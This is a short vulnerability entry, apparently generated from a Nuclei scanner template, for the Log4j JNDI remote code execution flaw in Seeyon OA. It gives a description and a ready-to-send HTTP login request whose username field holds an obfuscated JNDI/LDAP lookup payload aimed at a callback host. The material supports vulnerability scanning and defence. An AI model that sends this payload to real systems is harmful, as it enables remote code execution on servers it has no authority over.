# Vulnerability: Seeyon OA (Log4j) - Remote Code Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`seeyon-oa-log4j-rce.yaml`)

## Description
Seeyon OA is susceptible to remote code execution via the Apache Log4j 2 library prior to 2.15.0 by recording its own log information, specifically with specially crafted values sent as user input. Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI-related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /seeyon/main.do?method=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

authorization=&login.timezone=GMT+8:00&province=&city=&rectangle=&login_username=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}}
```

